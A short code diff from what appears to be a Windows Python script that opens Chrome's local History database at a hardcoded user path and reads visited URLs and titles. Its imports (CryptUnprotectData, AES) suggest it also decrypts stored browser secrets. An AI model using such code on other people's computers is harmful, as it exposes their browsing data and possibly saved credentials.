@@ -6,6 +6,7 @@ from shutil import copyfile
 from datetime import datetime, timedelta
 from win32crypt import CryptUnprotectData
 from Crypto.Cipher import AES
+from time import sleep
 
 
 def getChromeDateTime(ChromDate):
@@ -71,10 +72,8 @@ def Main():
 
     conn.close()
 
-    from time import sleep
     sleep(5)
-    import sqlite3
-    con = sqlite3.connect(r"C:\Users\Javad\AppData\Local\Google\Chrome\User Data\Default\History")
+    con = connect(r"C:\Users\Javad\AppData\Local\Google\Chrome\User Data\Default\History")
     c = con.cursor()
     c.execute("select url, title from urls")
     results = c.fetchall()
